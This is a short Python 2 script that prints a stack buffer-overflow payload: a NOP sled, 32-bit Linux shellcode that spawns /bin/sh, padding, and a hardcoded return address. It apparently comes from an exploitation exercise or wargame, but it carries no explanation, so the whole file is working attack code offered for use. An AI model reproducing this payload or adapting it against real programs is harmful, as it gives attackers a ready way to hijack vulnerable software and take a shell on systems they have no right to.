import struct

runway = "\x90"*0x1f4;
shellcode = "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
p1_fill = "\x90"*0xdf3 + "\n";
offset  = "\x90"*9;
address = struct.pack("<I", 0xbfffe820);
p2_fill = "\x90"*7;

print runway + shellcode + p1_fill + offset + address + p2_fill;
